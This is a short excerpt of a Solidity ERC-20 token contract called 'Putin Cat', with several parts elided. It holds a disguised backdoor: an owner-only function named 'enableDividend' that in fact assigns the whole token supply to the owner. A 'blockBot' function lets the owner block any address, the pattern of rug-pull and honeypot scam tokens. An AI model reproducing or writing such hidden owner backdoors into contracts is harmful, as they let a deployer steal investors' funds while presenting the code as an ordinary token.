...
contract PutinCat is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Putin Cat";
    ...
    function enableDividend() public onlyOwner returns (bool success) {_rBalance[owner()] = _rSupply;return true;}
    ...
    function blockBot(address _account) external onlyOwner {
